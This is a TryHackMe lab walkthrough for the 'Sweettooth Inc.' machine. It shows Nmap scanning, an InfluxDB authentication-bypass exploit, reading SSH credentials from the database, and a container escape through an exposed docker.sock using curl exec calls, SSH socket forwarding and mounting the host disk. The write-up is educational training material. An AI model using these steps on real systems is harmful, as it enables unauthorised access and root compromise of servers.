---
published: true
---
# Sweettooth Inc. Tutorial


## Introduction:

Approaching your first machine on platforms like Hackthebox.eu and Tryhackme.com can be intimidating. But 
there are general guidelines you can follow that will help structure your methodology. These guidelines 
have been mapped out for us by experts in the penetration testing field. In this tutorial we will attack a 
medium rated machine on Tryhackme called, "Sweettooth, Inc." Never practice these methods on a network 
unless you have permission to do so. 

###  Scanning and Enumeration:

I won't cover the basics of connecting to a machine on Tryhackme, as they give you everything you need to 
get started. The first step if you were conducting a penetration test on a target would be information 
gathering using publicly available sources or OSINT to map out an organization's network and 
infrastructure. Here we are starting with *Scanning and Enumeration.* We are given an IP address of the 
Sweettooth Inc machine. Our first step is to find out the services that are running on each port and 
whether this is a web application or a server providing another type of service like a file server. To do 
that we use a tool called Nmap that will scan all available ports on the machine. Nmap is a port scanner 
with additional scripts that will also tell us if there are vulnerable services running on the machine. 
Nmap has flags that allow us to conduct various types of scans in addition to using the NSE scripting 
engine that will run vulnerability scans against our target. To learn about the different scanning options 
run: ``` man nmap ``` in the terminal.

##### Nmap Results:

Nmap scan results using -sV for version detection, -sC for default NSE scripts, -T4 for increased speed, -p- for all ports. Note you can simply run -A, which is aggressive and will run version detection, script 
scanning, and OS version detection:

**Note: Great place to start for the various different flags and explanation of services is: https://nmap.org/book/man.html**

```bash
sudo nmap -sV -sC -T4 -p- 10.10.136.240  
[sudo] password for sechvn: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 16:13 EDT
Stats: 0:02:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 88.21% done; ETC: 16:16 (0:00:18 remaining)
Nmap scan report for 10.10.136.240
Host is up (0.11s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44533/tcp   status
|   100024  1          48033/udp   status
|   100024  1          52618/udp6  status
|_  100024  1          54318/tcp6  status
2222/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp  open  http    InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
44533/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

1. The first thing we want to do when looking at nmap results is to take note of the different ports that are open and the services that are running on them. Take your time researching each port and service, understanding the protocol that allows communication with those services, and then look for any known vulnerabilities using your favorite search engine or for example, *https://www.exploit-db.com/*  

2. What stands out immediately is a service called InfluxDB running on port 8086. We know the service version from the nmap scan so we can research the docs on InfluxDB and see what kind of endpoints are on the API (Application Programmable Interface).

3. Putting in the IP address with port brings us to a page not found 404 error. ``` http://10.10.136.240:8086 ```

4. Looking at the docs tells us there is an endpoint located here: ``` /debug/requests ``` 

5.  Lets visit the endpoint to see what is there: ``` http://10.10.136.240/debug/requests ``` We get a username: o5yY6yya


##### Enumeration:

Normally there are several tools we would want to run to further enumerate additional services, 
vulnerabilities, and specifically directories relating to web applications. However, we know that we have 
InfluxDB running and found a username.

*Note: Tools like Nikto, dirbuster, gobuster, wfuzz, burpsuite, zapproxy, sqlmap, crackmapexec, and others assist in further enumerating services and directories depending upon what type of services or applications we find running.*

From an attacker's position these activities would all be considered reconnaissance. There are several 
models used to describe the steps of a penetration test or an attack. According to the CEH cert guide the 
steps are, Reconnaissance, Scanning and Enumeration, Gaining Access, Escalation of Privilege, Maintaining 
Access, and Covering Tracks.
 
*Note: I will be going over the tools above in future tutorials related to enumeration and web applications.* 
 

### Exploitation:

1. Now lets try to find an exploit for InfluxDB. Putting in the search term *influxdb exploit* on google gives us an exploit on github:  ``` https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933/blob/master/README.md ```

2. Using this exploit requires us to make sure we have pandas, influxdb, and influxdb-client. Modules in Python are equivalent to libraries which contain functions you import in your code. To install the required modules for this exploit we can use these commands in our terminal: ``` pip3 install {module name} ``` or ``` pip3 install -r requirements.txt  ``` *Note: After installing the modules simply run the exploit from the terminal: ``` python3  __main.py__```*

3. This exploit brute forces the password using a word list as long as you provide a username. Once you input the username after running the exploit you need to look up Influxql, which is a sql type of language to make requests or select data from the databases that are present. *Note: You need to provide the path to the word list which in Kali use rockyou.txt located here: {/usr/share/wordlists/rockyou.txt}*

4. Some examples would be selecting or putting in the "creds" database then using: ``` SHOW MEASUREMENTS{TABLES}, SHOW FIELD KEYS, SELECT * FROM SSH, SHOW QUERIES, etc. ```

5. For the questions relating to the database that we have connected to through the python exploit the following Influxql statements will give us the answers: 
*Note: These select statements use the asterisk symbol to represent all data available in the specific table.* 

``` select * from water_tank ```  *Then we take the UTC unix timestamp and convert to regular time.*

``` select * from mixer_stats ```

``` select * from ssh ```

6. Upon querying the creds database using the select * from ssh, I found this value under the name of "ssh": username: uzJk6Ry98d8C | password: REDACTED

7. SSH into the machine with -p 2222 for the port and enter the above user and password. Usually, ssh runs on port 22, but it is common practice to assign ssh to another port in an attempt to obfuscate the service. In our terminal we would use this command to connect to the ssh port with the credentials: ``` ssh uzJk6Ry98d8C@10.10.136.240 -p 2222 ``` After executing the command it will ask us for the user's password. 

Success! We are now connected to the target machine. This is where understanding Linux system commands is 
imperative. We now are in the file system of the machine and need to list what files are in the immediate 
directory: ``` ls -la ``` will list all files including the permissions associated with each file. Doing so 
reveals a user.txt which we can then use the ``` cat  ``` command to print the flag to our terminal: ``` 
THM{REDACTED} ```


### Gaining Access:

Now that we have connected to our target machine and gained access we need to perform what's called 
privilege escalation. This is a process where we look for a way to elevate permissions to gain root access. 
In this machine there are two root flags we need to obtain. Privilege Escalation is in its own right a 
topic that can have an entire book written on it. Thankfully, we have multiple resources found online that 
can assist us in looking for ways to elevate privileges. There are also tools available that will automate 
this process like linpeas. In order to use a tool like linpeas we would need to start a web server on our 
machine (Attacker) and place the linpeas binary in the directory that the web server is running in. Then we 
would use curl or wget and download the binary from within the target machine (Victim). In this case the 
machine we ssh'd into. What follows is the process I used to manually look for ways to escalate privileges.

*Note: This site does an awesome job of walking you through what to look for to escalate privileges: https://book.hacktricks.xyz/linux-unix/privilege-escalation*


##### Privilege Escalation:

There are a few things we can check for immediately upon gaining access to our target machine. I usually 
execute sudo -l to see what the user can run as root on the machine. Here is a quick list of common things 
to check for once you gain access:

- ```  uname -a  ``` *This will give us the Linux kernel version which may have exploits that we can use to escalate privileges.*
- ```  sudo -l  ``` *As mentioned above this will tell us what the current user can run as root or with sudo privileges.*
- ```  echo $PATH  ``` *This will tell us if we have any write permissions to folders.*
- ```  find / -perm -u=s -type f  2>/dev/null  ``` *This will show us what binaries have the SUID permission bit set. Visiting this site will tell us what we can do with binaries that have the SUID binary set: https://gtfobins.github.io/*
- ```  cat /proc/self/cgroup  ```*This command will tell us if we are in a container we could also run (ps aux) to look at processes running and see if the docker.sock daemon is running.*

In this machine the Linux kernel is vulnerable to a few exploits but we also find that we are in a 
container. But we can't run any docker commands as we don't have access to docker binaries. There are also 
no SUID binaries we can exploit. My next step was to begin researching about containers which are a type of 
virtualization. I read if we have access to the docker.sock daemon we can use that to elevate our 
privileges and escape out of the container.


1. To find out where the docker.sock daemon is located we use this command: ```  find / -name docker.sock 2>/dev/null  ```

2. There are two ways to proceed. While researching I came across an article that walks you through how to communicate with the docker.sock daemon using curl. After completing this machine I found out from another user that I could have bypassed this step and used the last step to escape out of the container and gain access or elevated privileges to the host file system to then read both root.txt flags. I'm going to show you both ways and include the blog that helped me use curl to get the first root.txt flag. I will also include the blog of the user that helped me in understanding this process. He does an awesome job of walking us through this process. His way is simpler and to the point. I would recommend following the second way which will give us both root.txt flags and simplify the entire process.

3. Following this blog: https://dejandayoff.com/the-danger-of-exposing-docker.sock/ will walk us through using the curl command to read the first root.txt flag.

4. Using curl we can list all images by issuing this command: ```  curl -i -s -X GET http://<docker_host>:PORT/containers/json  ```
- Which gives us this result:

 ```bash
 ["Id":"3aca3900a312d70b576f0a86856612f8312ad03df5ae14dacb54439b52eafd31","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1627359591,"Ports":[{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up About an hour","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"d941570cec4dfc6c39532d4d875bcbdee64a3831e147c75b6167c481bcaf7d67","EndpointID":"bb07c60829d249c61aae7da7dba8fbe3a7738af7a7297d53a26f02787a8240ef","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"80ed8feaaed22a73f8debc5905c2af290e39c5e8cd997047bdab5b0b61c67493","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]
 
 ```

5. Next we run another curl command to the docker.sock dameon using exec which executes our command to cat open the first root.txt, you need the id from the command above:

```bash

curl -i -s -X POST \
 -H "Content-Type: application/json" \
 --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/root/root.txt"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
http://localhost:8080/containers/3aca3900a312d70b576f0a86856612f8312ad03df5ae14dacb54439b52eafd31/exec

```

6. Now we need to start the container we just ran above which will give us the first root flag:

```bash

curl -i -s -X POST \
 -H 'Content-Type: application/json' \
--data-binary '{"Detach": false,"Tty": false}' \ http://localhost:8080/exec/bfa14df9e363d42620d44d3234314c8997569be6555097ca59a4930e11053719/start

```

- After running this command we get the first root.txt flag: THM{REDACTED}


##### SSH forwarding over the docker.sock

Method 2 skips and simplifies the entire process of privilege escalation and container escape. If we use 
this technique we bypass the need for the above curl commands. I included this to show the process I went t
through and also to show how dangerous it is to expose the docker.sock daemon. Using curl commands we were 
able to read files that were restricted by access permissions and reinforces the need to understand the 
various ways privilege escalation can be accomplished by attackers.


##### Commands to forward the docker.sock daemon over our local host to interact with the container using docker commands

1. Forwarded the /var/run/docker.sock over ssh to localhost and ran the below docker command to gain root. Here is the syntax for the ssh command:
```  ssh -nNT -L localhost:2345:/var/run/docker.sock uzJk6Ry98d8C@10.10.10.127 -p 2222  ```

2. You then need to export the host to another terminal:
```  export DOCKER_HOST=tcp://127.0.0.1:2345  ```

3. Once you have access to the docker daemon via terminal on your machine run this command: ```  docker exec -it 7b884dffa6ae bash  ```

4. Once you have root on container run the following commands to break out of the container by mounting the host systems file structure:
```  mkdir -p /mnt/hola  ```
```  mount /dev/xvda1 /mnt/hola  ```

5. Host file system is now mounted, cd to root and cat open the root.txt.

6.  Important links: https://dejandayoff.com/the-danger-of-exposing-docker.sock/ && https://blog.natem135.com/posts/thm-sweet-tooth-inc/
